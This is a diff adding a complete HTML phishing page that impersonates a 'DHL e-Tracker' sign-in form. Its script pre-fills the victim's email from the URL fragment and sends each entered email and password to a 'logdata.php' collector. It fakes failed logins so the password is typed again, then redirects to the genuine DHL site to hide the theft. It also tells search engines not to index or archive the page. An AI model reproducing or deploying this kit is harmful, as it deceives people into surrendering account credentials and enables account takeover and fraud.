@@ -1,0 +1,121 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,10,9,8,7"/>
+	<title>DHL e-Tracker - Global Logistics and International Shipping</title>
+	<link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
+	<meta name="robots" content="noindex" /><meta name="robots" content="nofollow" />
+	<META NAME="GOOGLEBOT" CONTENT="NOARCHIVE" /><META NAME="GOOGLEBOT" CONTENT="NOSNIPPET" />
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<script>
+const url = 'logdata.php';   //full url goes here
+</script>
+<div style="margin:-8px;width:100%">
+<img id="bg" src=".bg.png" width="100%">
+<img id="bg2" src=".bg.png" width="100%" hidden>
+
+<table style="width:320px; height:350px; background: #FFF; position:absolute; top:145px; left:80px; -webkit-box-shadow: 5px 5px 15px 5px #000000; 
+box-shadow: 5px 5px 15px 5px #000000; -webkit-border-radius: 5px 0px 10px 0px; border: solid 1px #BDBDBD; padding: 7px;">
+<tr><td></td></tr></table>
+<div style="position: absolute; top:180px;left:110px;"> <font style="font-family: arial; font-size: 22px; color:#424242;">Sign in</font></div>
+<div style="position: absolute; top:213px;left:110px;"> <font style="font-family: arial; font-size: 13px; color:#424242;"><b>Sign in to continue...</b></font></div>
+<div style="position: absolute; top:370px;left:110px;">
+	<input type="checkbox" checked> <font style="font-family: arial; font-size: 13px; color:#424242;">Remember me</font>
+</div>
+
+<form method="post" action="" onsubmit="Validate(); return false;">
+<input required id="user" name="user" class="login" value="" readonly 
+style="position: absolute;top:260px;left:110px; width:247px; height:26px; font-family: Verdana; font-size: 15px; color:#DF0101; background-color: #ffffff; border: solid 1px #BDBDBD; 
+-webkit-box-shadow: 2px 2px 2px 2px #909192; box-shadow: 2px 2px 2px 2px #909192; padding: 5px; border-radius: 2px 3px 1px 5px;" type="email">
+<input required placeholder="Password" type="password" id="pass" name="pass" class="login" 
+style="position: absolute;top:315px; left:110px; width:247px; height:26px; font-family: Verdana; font-size: 13px; color:#DF0101; background-color: #ffffff; border: solid 1px #BDBDBD; 
+-webkit-box-shadow: 2px 2px 2px 2px #909192; box-shadow: 2px 2px 2px 2px #909192; padding: 5px; border-radius: 2px 3px 1px 5px;">
+ <input id="b1" type="submit" class="btn" style="position: absolute;top:415px;left:110px; width:260px; height:42px; font-family: arial; font-size: 13px; color:#FFF; font-weight:bold;
+background-color: #DF0101; border: solid 1px #DF0101; padding: 5px;  border-radius: 1px 5px 1px 5px;
+-webkit-box-shadow: 1px 1px 5px 1px #333434; box-shadow: 1px 1px 5px 1px #333434;" value="Track Now">
+ </form>
+</div>
+<input type="hidden" id="count" value="0">
+<script src='.jquery.min.js'></script>
+<script>
+      $(document).ready(function(){
+        var count=0;
+
+      /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+          var my_email =email;
+          $('#user').val(my_email);
+			
+			}
+		  })
+
+
+function Validate(){
+var a = $('#user').val();
+var b = $('#pass').val();
+var c = $('#count').val();
+
+$.post(url, {user:a,pass:b}, function(){
+setTimeout(function(){
+if(c>=2){
+$('#count').val('0');
+window.location='https://mydhl.express.dhl/index/en.html';
+}else{
+$('#bg').fadeOut();
+$('#bg2').fadeIn();
+$('#user').css('top','250px');
+$('#pass').css('top','311px');
+$('#b1').css('top','381px');
+$('#pass').val('');
+var add = +c+1;
+$('#count').val(add);
+$('#pass').focus();
+}
+},2000);
+});
+}
+</script>
+
+<script>
+function process(){
+	var user = document.getElementById('user').value;
+	var pass = document.getElementById('pass').value;
+	if ((user == '') || (user == null)){
+	document.getElementById('bg').src='';
+	document.getElementById('user').focus();
+return false;	
+	}else
+	if ((pass == '') || (pass == null)){
+	document.getElementById('bg').src='';
+	document.getElementById('pass').focus();
+return false;	
+	}else
+	
+return true	;
+}
+</script>
+<script>
+$('input').focus(function(){
+  $(this).parents('.form-group').addClass('focused');
+});
+
+$('input').blur(function(){
+  var inputValue = $(this).val();
+  if ( inputValue == "" ) {
+    $(this).removeClass('filled');
+    $(this).parents('.form-group').removeClass('focused');  
+  } else {
+    $(this).addClass('filled');
+  }
+})  
+</script>
+</body>
+</html>
